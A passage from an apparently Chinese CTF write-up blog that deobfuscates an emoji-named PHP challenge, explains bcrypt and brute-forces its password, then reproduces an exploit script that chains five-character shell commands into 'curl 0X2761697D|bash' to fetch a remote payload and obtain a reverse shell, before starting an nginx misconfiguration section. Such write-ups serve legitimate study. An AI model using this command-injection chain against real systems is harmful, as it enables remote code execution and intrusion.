class=\"string\">'🙎'</span>,<span class=\"string\">'🙏'</span>);</span><br><span class=\"line\">$🏁 = <span class=\"keyword\">array</span>($🙠,$🙠,$🙰,$😀,$😐,$😠,$😰,$🙀);</span><br><span class=\"line\">$😳😃😢🙉😲😗😦🙅 = <span class=\"string\">\"strlen\"</span>;</span><br><span class=\"line\">$😩😂😸🙉 = <span class=\"string\">\"chr\"</span>;</span><br><span class=\"line\">$🎁 = <span class=\"string\">\"base64_decode\"</span>;</span><br><span class=\"line\">$😱😨😞🙊😪😨😡😍 = <span class=\"string\">\"isset\"</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> 😪😗😦😺😲😂😢😼<span class=\"params\">($😳😃😢🙉)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> $🏁,$😳😃😢🙉😲😗😦🙅,$😩😂😸🙉,$🎁,$😱😨😞🙊😪😨😡😍;</span><br><span class=\"line\">\t$😲😗😦🙅= (<span class=\"string\">\"$😳😃😢🙉😲😗😦🙅\"</span>)($😳😃😢🙉)/<span class=\"number\">4</span>;</span><br><span class=\"line\">\t$😳😂😚😼 = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> ($😱😧😼🙀 = <span class=\"number\">0</span>;$😱😧😼🙀&lt;$😲😗😦🙅;$😱😧😼🙀++) &#123;</span><br><span class=\"line\">\t\t$😩😂😦🙃 =$😳😃😢🙉[$😱😧😼🙀*<span class=\"number\">4</span>].$😳😃😢🙉[$😱😧😼🙀*<span class=\"number\">4</span>+<span class=\"number\">1</span>].$😳😃😢🙉[$😱😧😼🙀*<span class=\"number\">4</span>+<span class=\"number\">2</span>].$😳😃😢🙉[$😱😧😼🙀*<span class=\"number\">4</span>+<span class=\"number\">3</span>];</span><br><span class=\"line\">\t\t$😪😾😞😀 =<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t$😳😂😦😺 =<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> ($😱😽🙀🙁 =<span class=\"number\">0</span>;$😱😽🙀🙁&lt;<span class=\"number\">8</span>;$😱😽🙀🙁++) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span> ($😱😂🙄🙂=<span class=\"number\">0</span>;$😱😂🙄🙂&lt;<span class=\"number\">16</span>;$😱😂🙄🙂++) &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span>($😩😂😦🙃 == $🏁[$😱😽🙀🙁][$😱😂🙄🙂]) &#123;</span><br><span class=\"line\">\t\t\t\t\t$😪😾😞😀=$😱😽🙀🙁;</span><br><span class=\"line\">\t\t\t\t\t$😳😂😦😺 = $😱😂🙄🙂;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t$😲😾😦🙄 = $😪😾😞😀*<span class=\"number\">16</span>+$😳😂😦😺;</span><br><span class=\"line\">\t\t$😳😂😚😼 = $😳😂😚😼.(<span class=\"string\">\"$😩😂😸🙉\"</span>)($😲😾😦🙄);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (<span class=\"string\">\"$🎁\"</span>)($😳😂😚😼);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> 😁😁<span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> $🏁,$😳😃😢🙉😲😗😦🙅,$😩😂😸🙉,$🎁,$😱😨😞🙊😪😨😡😍;</span><br><span class=\"line\">\t$😳😂😖🙅😪😗😚 = 😪😗😦😺😲😂😢😼(😜😃😪😸😳😹😉😃😴😃😳🙆😱😘😢🙄😲😓😉🙊😩😧😅😻😩😽😉😄😜🙇😍😍).😪😗😦😺😲😂😢😼(😲😧😡😁)($_SERVER[😪😗😦😺😲😂😢😼(😥😻😦😞😤😁😢😖😨😀😖😕😢😖😙😍)]);</span><br><span class=\"line\">\t😪😗😦😺😲😂😢😼(😲😧🙄😻😱😨😙😍)($😳😂😖🙅😪😗😚);</span><br><span class=\"line\">\t😪😗😦😺😲😂😢😼(😩😂😸😻😱😨😙😍)($😳😂😖🙅😪😗😚);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[😪😗😦😺😲😂😢😼(😩😂😁😻)]) &amp;&amp; ($😳😃😢🙉😲😗😦🙅)($_GET[😪😗😦😺😲😂😢😼(😩😂😁😻)]) &lt;= <span class=\"number\">5</span>) &#123;</span><br><span class=\"line\">\t\t@😪😗😦😺😲😂😢😼(😪😨😸😼😩🙇😍😍)($_GET[😪😗😦😺😲😂😢😼(😩😂😁😻)]);</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[😪😗😦😺😲😂😢😼(😳😽😦🙊😪😨😡😍)])) &#123;</span><br><span class=\"line\">\t\t@😪😗😦😺😲😂😢😼(😪😨😸😼😩🙇😍😍)(😪😗😦😺😲😂😢😼(😳😽😀😷😜😨😚😽😙😑😍😍) . $😳😂😖🙅😪😗😚);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$🎯 = <span class=\"keyword\">new</span> Bcrypt();</span><br><span class=\"line\">$🔑 = $_POST[😪😗😦😺😲😂😢😼(😳😗😖🙊😳😃😴😻)];</span><br><span class=\"line\">$🔒 = 😪😗😦😺😲😂😢😼(😚😔😚😅😚😔😕🙇😚😖😚😓😪😽😻😄😥😨😒😛😣😼😖😢😲😥🙀😕😞😻😪😅😲😘😦🙉😣😽😦🙈😲😦😑🙅😞😽😞😞😲😺😴😀😪😗😉😜😩😃🙀😝😝😾😩😅😱😖😞😺😪😔😼😆😢😗😿🙊😴😁😸😼);</span><br><span class=\"line\"><span class=\"keyword\">if</span>($🎯-&gt;verify($🔑, $🔒)) &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span>(😪😗😦😺😲😂😢😼(😠😓😉😹😳😺😅😡😩😨😞🙊😴😂😉🙉😪😓😒😂😪😨😚🙀😪😽😼😼😪😓😕😈😜😂😚🙉😠😷😍😍));</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span>(😪😗😦😺😲😂😢😼(😦😂😉😃😙😣😖😟😲😃😳🙃😱😗😖😺😱🙉😒🙀😴😓😕😈😜😂😚🙉😠😷😍😍));</span><br><span class=\"line\">\t😁😁();</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span>(😪😗😦😺😲😂😢😼(😠😓😉😹😳😺😅😡😩😨😞🙊😴😂😉🙉😪😓😒🙅😲😃😡😷😲😧😖😀😩😂😷😸😠😓😉😹😳😺😄😍));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>首先是代码格式化，接着就是<strong>理解代码的执行逻辑，顺便改变代码逻辑</strong></p>\n<p>看题解上看的是第一个函数，也就是混淆</p>\n<p>为什么要先看第一个函数</p>\n<p><img src=\"/2020/09/28/%E5%A4%8D%E7%8E%B0wp/image-20200929221307190.png\" alt=\"image-20200929221307190\"></p>\n<p>所以我们就想直接看在不同参数下第一个函数执行输出的结果，所以在第一个函数中添加</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> 😪😗😦😺😲😂😢😼<span class=\"params\">($😳😃😢🙉)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">\"加密后：\"</span>.$😳😃😢🙉;</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> $🏁,$😳😃😢🙉😲😗😦🙅,$😩😂😸🙉,$🎁,$😱😨😞🙊😪😨😡😍;</span><br><span class=\"line\">\t$😲😗😦🙅= (<span class=\"string\">\"$😳😃😢🙉😲😗😦🙅\"</span>)($😳😃😢🙉)/<span class=\"number\">4</span>;</span><br><span class=\"line\">\t$😳😂😚😼 = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> ($😱😧😼🙀 = <span class=\"number\">0</span>;$😱😧😼🙀&lt;$😲😗😦🙅;$😱😧😼🙀++) &#123;</span><br><span class=\"line\">\t\t$😩😂😦🙃 =$😳😃😢🙉[$😱😧😼🙀*<span class=\"number\">4</span>].$😳😃😢🙉[$😱😧😼🙀*<span class=\"number\">4</span>+<span class=\"number\">1</span>].$😳😃😢🙉[$😱😧😼🙀*<span class=\"number\">4</span>+<span class=\"number\">2</span>].$😳😃😢🙉[$😱😧😼🙀*<span class=\"number\">4</span>+<span class=\"number\">3</span>];</span><br><span class=\"line\">\t\t$😪😾😞😀 =<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t$😳😂😦😺 =<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> ($😱😽🙀🙁 =<span class=\"number\">0</span>;$😱😽🙀🙁&lt;<span class=\"number\">8</span>;$😱😽🙀🙁++) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span> ($😱😂🙄🙂=<span class=\"number\">0</span>;$😱😂🙄🙂&lt;<span class=\"number\">16</span>;$😱😂🙄🙂++) &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span>($😩😂😦🙃 == $🏁[$😱😽🙀🙁][$😱😂🙄🙂]) &#123;</span><br><span class=\"line\">\t\t\t\t\t$😪😾😞😀=$😱😽🙀🙁;</span><br><span class=\"line\">\t\t\t\t\t$😳😂😦😺 = $😱😂🙄🙂;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t$😲😾😦🙄 = $😪😾😞😀*<span class=\"number\">16</span>+$😳😂😦😺;</span><br><span class=\"line\">\t\t$😳😂😚😼 = $😳😂😚😼.(<span class=\"string\">\"$😩😂😸🙉\"</span>)($😲😾😦🙄);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">\"原文：\"</span>.(<span class=\"string\">\"$🎁\"</span>)($😳😂😚😼);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (<span class=\"string\">\"$🎁\"</span>)($😳😂😚😼);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>之后依次修改代码逻辑，替换其中第一个函数输出结果</p>\n<p>核心代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> 😁😁<span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> $🏁,$strlen,$chr,$base64_decode,$isset;</span><br><span class=\"line\">\t$path = <span class=\"string\">\"/var/www/html/sandbox/\"</span>.md5($_SERVER[<span class=\"string\">'REMOTE_ADDR'</span>]);</span><br><span class=\"line\">\tmkdir($path);</span><br><span class=\"line\">\tchdir($path);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class=\"string\">'cmd'</span>]) &lt;= <span class=\"number\">5</span>) &#123;</span><br><span class=\"line\">\t\t@exec($_GET[<span class=\"string\">'cmd'</span>]);</span><br><span class=\"line\">\t\t<span class=\"comment\">//</span></span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'reset'</span>])) &#123;</span><br><span class=\"line\">\t\t@exec(<span class=\"string\">\"rm -rf\"</span> . $path);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$🎯 = <span class=\"keyword\">new</span> Bcrypt();</span><br><span class=\"line\"></span><br><span class=\"line\">$🔑 = $_POST[<span class=\"string\">\"passwd\"</span>];</span><br><span class=\"line\">$🔒 = <span class=\"string\">\"$2y$10$RBfi8QpJJQQmJD6FylurJeqmP.6cMn7tdoKczL2v9hScd9zDj3wXe\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>($🎯-&gt;verify($passwd, $lock)) &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">\"Password verified!\"</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">\"Wow!!Now,hack it!\"</span>;</span><br><span class=\"line\">\t😁😁();</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;/br&gt;Password not match!&lt;/br&gt;\"</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>然后发现有composer包，安装，然后查资料bcrypt</p>\n<h3 id=\"bcrypt\"><a href=\"#bcrypt\" class=\"headerlink\" title=\"bcrypt\"></a>bcrypt</h3><p><code>bcrypt</code>是一种哈希算法，可以通过硬件进行扩展（通过可配置的循环次数）。</p>\n<p><strong><code>bcrypt</code>是一种单向哈希算法。</strong>如果不知道盐，圆<strong>和密码</strong>（密码），则无法检索纯文本密码。</p>\n<blockquote>\n<p>加盐：</p>\n<p>就是人为的通过一组随机字符与用户原密码的组合形成一个新的字符，从而增加破译的难度。</p>\n</blockquote>\n<p>在php中，主要有内置的函数<code>password_hash</code>和<code>password_verify</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a = password_hash(<span class=\"string\">'password'</span>,PASSWORD_DEFAULT);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $a.<span class=\"string\">\"&lt;br&gt;\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(password_verify(<span class=\"string\">'password'</span>,$a))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"success\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"failed\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var_dump(password_get_info($a));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#输出信息</span></span><br><span class=\"line\"><span class=\"keyword\">array</span> (size=<span class=\"number\">3</span>)</span><br><span class=\"line\">  <span class=\"string\">'algo'</span> =&gt; int <span class=\"number\">1</span></span><br><span class=\"line\">  <span class=\"string\">'algoName'</span> =&gt; string <span class=\"string\">'bcrypt'</span> (length=<span class=\"number\">6</span>)</span><br><span class=\"line\">  <span class=\"string\">'options'</span> =&gt; </span><br><span class=\"line\">    <span class=\"keyword\">array</span> (size=<span class=\"number\">1</span>)</span><br><span class=\"line\">      <span class=\"string\">'cost'</span> =&gt; int <span class=\"number\">10</span></span><br><span class=\"line\">$a = password_hash(<span class=\"string\">'password'</span>,PASSWORD_DEFAULT,<span class=\"keyword\">array</span>(<span class=\"string\">'cost'</span> =&gt; <span class=\"number\">11</span>));</span><br><span class=\"line\"><span class=\"comment\">//相应的cost也会变为11；</span></span><br></pre></td></tr></table></figure>\n<p>接下来就是爆破，已知密码为bcrypt+4位小写字母</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"keyword\">require</span> <span class=\"string\">'vendor/autoload.php'</span>; </span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Bcrypt</span>\\<span class=\"title\">Bcrypt</span>; </span><br><span class=\"line\">$key = <span class=\"string\">\"abcdefghijklmnopqrstuvwxyz\"</span>; </span><br><span class=\"line\">$bcrypt = <span class=\"keyword\">new</span> Bcrypt(); </span><br><span class=\"line\">$plaintext = <span class=\"string\">'bcrypt'</span>;<span class=\"comment\">//bcryptyyds </span></span><br><span class=\"line\">$ciphertext = <span class=\"string\">'$2y$10$RBfi8QpJJQQmJD6FylurJeqmP.6cMn7tdoKczL2v9hScd9zDj3wXe'</span>; </span><br><span class=\"line\"><span class=\"keyword\">for</span>($i=<span class=\"number\">0</span>;$i&lt;<span class=\"number\">26</span>;$i++) &#123; </span><br><span class=\"line\">    <span class=\"keyword\">for</span>($j=<span class=\"number\">0</span>;$j&lt;<span class=\"number\">26</span>;$j++) &#123; </span><br><span class=\"line\">        <span class=\"keyword\">for</span>($k=<span class=\"number\">0</span>;$k&lt;<span class=\"number\">26</span>;$k++) &#123; </span><br><span class=\"line\">            <span class=\"keyword\">for</span>($m=<span class=\"number\">0</span>;$m&lt;<span class=\"number\">26</span>;$m++) &#123; </span><br><span class=\"line\">                <span class=\"keyword\">echo</span> $plaintext.$str.PHP_EOL; </span><br><span class=\"line\">                $str = $key[$i].$key[$j].$key[$k].$key[$m]; </span><br><span class=\"line\">                <span class=\"keyword\">if</span>($bcrypt-&gt;verify($plaintext.$str, $ciphertext))&#123; </span><br><span class=\"line\">                    <span class=\"keyword\">echo</span>(<span class=\"string\">\"&lt;/br&gt;Password verified!&lt;/br&gt;\"</span>); </span><br><span class=\"line\">                    <span class=\"keyword\">echo</span>(<span class=\"string\">\"Wow!!Now,hack it!&lt;/br&gt;\"</span>); </span><br><span class=\"line\">                &#125; </span><br><span class=\"line\">            &#125; </span><br><span class=\"line\">        &#125; </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"命令执行\"><a href=\"#命令执行\" class=\"headerlink\" title=\"命令执行\"></a>命令执行</h3><p>最终的考点就是命令执行可以参考hitcon-ctf-2017</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> 😁😁<span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> $🏁,$strlen,$chr,$base64_decode,$isset;</span><br><span class=\"line\">\t$path = <span class=\"string\">\"/var/www/html/sandbox/\"</span>.md5($_SERVER[<span class=\"string\">'REMOTE_ADDR'</span>]);</span><br><span class=\"line\">\tmkdir($path);</span><br><span class=\"line\">\tchdir($path);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class=\"string\">'cmd'</span>]) &lt;= <span class=\"number\">5</span>) &#123;</span><br><span class=\"line\">\t\t@exec($_GET[<span class=\"string\">'cmd'</span>]);</span><br><span class=\"line\">\t\t<span class=\"comment\">//</span></span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'reset'</span>])) &#123;</span><br><span class=\"line\">\t\t@exec(<span class=\"string\">\"rm -rf\"</span> . $path);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这道题大概意思就是存在命令执行，但单次输入字符不得大于5。因此利用linux下特有的命令来写入shell反弹。原理就是利用curl ip|bash等很多方式去反弹shell。顺便也复习了反弹shell的一些基本操作</p>\n<p>官方的脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\"><span class=\"keyword\">from</span> time <span class=\"keyword\">import</span> sleep</span><br><span class=\"line\">url = <span class=\"string\">\"http://219.219.61.234:10048/?cmd=\"</span></span><br><span class=\"line\">payload = [</span><br><span class=\"line\">    <span class=\"comment\"># generate \"g&gt; ht- sl\" to file \"v\"</span></span><br><span class=\"line\">    <span class=\"string\">'&gt;dir'</span>,</span><br><span class=\"line\">    <span class=\"string\">'&gt;sl'</span>,</span><br><span class=\"line\">    <span class=\"string\">'&gt;g\\&gt;'</span>,</span><br><span class=\"line\">    <span class=\"string\">'&gt;ht-'</span>,</span><br><span class=\"line\">    <span class=\"string\">'*&gt;v'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># reverse file \"v\" to file \"x\", content \"ls -th &gt;g\" '</span></span><br><span class=\"line\">    <span class=\"string\">'&gt;rev'</span>,</span><br><span class=\"line\">    <span class=\"string\">'*v&gt;x'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># generate \"curl 0X2761697D|bash\"</span></span><br><span class=\"line\">    <span class=\"string\">'&gt;sh '</span>,</span><br><span class=\"line\">    <span class=\"string\">'&gt;ba\\\\'</span>,</span><br><span class=\"line\">    <span class=\"string\">'&gt;\\|\\\\'</span>,</span><br><span class=\"line\">    <span class=\"string\">'&gt;\\\\'</span>,</span><br><span class=\"line\">    <span class=\"string\">'&gt;7D\\\\'</span>,</span><br><span class=\"line\">    <span class=\"string\">'&gt;69\\\\'</span>,</span><br><span class=\"line\">    <span class=\"string\">'&gt;61\\\\'</span>,</span><br><span class=\"line\">    <span class=\"string\">'&gt;27\\\\'</span>,</span><br><span class=\"line\">    <span class=\"string\">'&gt;0X\\\\'</span>,</span><br><span class=\"line\">    <span class=\"string\">'&gt;\\ \\\\'</span>,</span><br><span class=\"line\">    <span class=\"string\">'&gt;rl\\\\'</span>,</span><br><span class=\"line\">    <span class=\"string\">'&gt;cu\\\\'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># got shell</span></span><br><span class=\"line\">    <span class=\"string\">'sh x'</span>,</span><br><span class=\"line\">    <span class=\"string\">'sh g'</span>,</span><br><span class=\"line\">]</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> payload:</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> len(i) &lt;= <span class=\"number\">5</span></span><br><span class=\"line\">    data = &#123; <span class=\"string\">'passwd'</span>:<span class=\"string\">'bcryptyyds'</span>, &#125;</span><br><span class=\"line\">    header = &#123; <span class=\"string\">\"Content-Type\"</span> : <span class=\"string\">\"application/x-www-form-urlencoded\"</span>,</span><br><span class=\"line\">               <span class=\"string\">\"Accept\"</span> : <span class=\"string\">\"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,ima ge/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\"</span>,</span><br><span class=\"line\">               <span class=\"string\">\"Upgrade-Insecure-Requests\"</span> : <span class=\"string\">\"1\"</span> &#125;</span><br><span class=\"line\">    r = requests.post(url + urllib.quote(i),data=data,headers=header)</span><br><span class=\"line\">    print(i)</span><br><span class=\"line\">    sleep(<span class=\"number\">0.1</span>)</span><br></pre></td></tr></table></figure>\n<p>这个很郁闷，配置环境很长时间还是没能弄出来</p>\n<h2 id=\"EZnode\"><a href=\"#EZnode\" class=\"headerlink\" title=\"EZnode\"></a>EZnode</h2><p>应该是国赛分区赛的题</p>\n<h3 id=\"考点-3\"><a href=\"#考点-3\" class=\"headerlink\" title=\"考点\"></a>考点</h3><p>nginx反向代理配置错误</p>\n<p>首先来学习一下ngnix</p>\n<h3 id=\"ngnix\"><a href=\"#ngnix\" class=\"headerlink\" title=\"ngnix\"></a>ngnix</h3><p>ngnix是一款自由的、开源的、高性能的HTTP服务器和反向代理服务器。</p>\n<p>主要在三个方面</p>\n<ul>\n<li>反向代理</li>\n<li>负载均衡</li>\n<li>nginx特点</li>\n</ul>\n<p><strong>反向代理</strong></p>\n<blockquote>\n<p>先说正向代理</p>\n<p>客户端非常明确要访问的服务器地址；服务器只清楚请求来自哪个代理服务器，而不清楚来自哪个具体的客户端；正向代理模式屏蔽或者隐藏了真实客户端信息。</p>\n</blockquote>\n<p><img src=\"/2020/09/28/%E5%A4%8D%E7%8E%B0wp/image-20201004160128766.png\" alt=\"image-20201004160128766\"></p>\n<p>上面这个图就很形象了</p>\n<p>多个客户端给服务器发送的请求，nginx服务器接收到之后，</p>\n<p>按照一定的规则分发给了后端的业务处理服务器进行处理了。</p>\n<p>此时~请求的来源也就是客户端是明确的，但是请求具体由哪台服务器处理的并不明确了，nginx扮演的就是一个反向代理角色</p>\n<p><strong>负载均衡</strong></p>\n<p>在反向代理中</p>\n<p>客户端会向服务端发出请求，而服务器将接受到的请求按照规则分发的过程，就叫做负载均衡</p>\n<p><strong>ngnix配置</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">main                                # 全局配置</span><br><span class=\"line\"> </span><br><span class=\"line\">events &#123;                            # nginx工作模式配置</span><br><span class=\"line\"> </span><br><span class=\"line\">&#125;</span><br><span 